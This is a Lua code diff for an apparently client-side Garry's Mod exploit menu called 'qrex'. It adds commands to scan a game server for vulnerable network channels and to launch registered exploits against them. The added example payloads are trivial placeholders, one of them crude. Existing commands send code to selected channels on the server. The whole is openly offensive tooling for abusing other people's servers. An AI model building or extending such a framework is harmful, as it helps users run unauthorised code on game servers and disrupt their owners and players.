@@ -2,6 +2,7 @@ local prefix = "qrex"
 local channel = ""
 local lPlayer = LocalPlayer():EntIndex()
 local vulChannel = {}
+local vulExploit = {}
 local commands = {}
 local exploits = {}
 local groups = {}
@@ -88,17 +89,42 @@ for k, v in pairs(groups) do
   end
 end
 
+local function scanExploits()
+vulExploit = {}
+MsgC(Color(166,222,255), "To launch an exploit use the following command: "..prefix.."_ex_launch <ID>\n")
+for k, v in pairs(exploits) do
+    if(checkChannel(v.channel)) then
+          local id = table.Count(vulExploit)
+            vulExploit[id] = v
+          MsgC(Color(255, 255, 255), v.id..") ", Color(166, 222, 255), v.name.. " - ", Color(155, 155, 155), v.channel.."\n")
+    end
+  end
+end
+
+local function launchExploit(ply, cmd, args)
+if(!args[1]) then return end
+  local id = tonumber(args[1])
+  if(!vulExploit[id]) then MsgC(Color(166,222,255), "Invalid exploit ID \n")
+    return
+  end
+  net.Start(vulExploit[id].channel)
+  vulExploit[id].func()
+  net.SendToServer()
+  MsgC(Color(166,222,255), "Exploit has been launched!\n")
+end
+
 local function addCommand(command, desc, group, func)
   concommand.Add(prefix.."_"..command, func)
   commands[tostring(command)] = {name = prefix.."_"..command, description = desc, group = group}
 end
 
-local function addExploit(channel)
-
+local function addExploit(name, channel, func)
+  local id = table.Count(exploits)
+  exploits[id] = {name = name, id = id, channel = channel, func = func, vulnerable = false}
 end
 
 local function testFunction()
-  print(string.Replace([[print("test")]],[["]],"'"))
+  PrintTable(vulExploit)
 end
 
 local function init()
@@ -111,6 +137,11 @@ addCommand("pl_run", "Sends function to selected channel.", "Payloads", luaRun)
 addCommand("pl_run_cl", "Sends function to selected channel but targets you.", "Payloads", luaRunOnLocal)
 addCommand("util_dump", "Dump all the networking channels in a nice neat list.", "Utility", dumpNet)
 addCommand("util_target", "Sets the target channel (Takes 1 argument).", "Utility", setTarget)
+addCommand("ex_scan", "Scans for possible exploits on the server.", "Exploits", scanExploits)
+addCommand("ex_launch", "Launch exploit from ID", "Exploits", launchExploit)
+	
+addExploit("Testexploit", "striphelper", function() net.WriteString("print('titties')") end)
+addExploit("bruh", "gmod_cameasdra", function() print("meme") end)
 
 for k, v in pairs(commands) do
   groups[v.group] = v.group
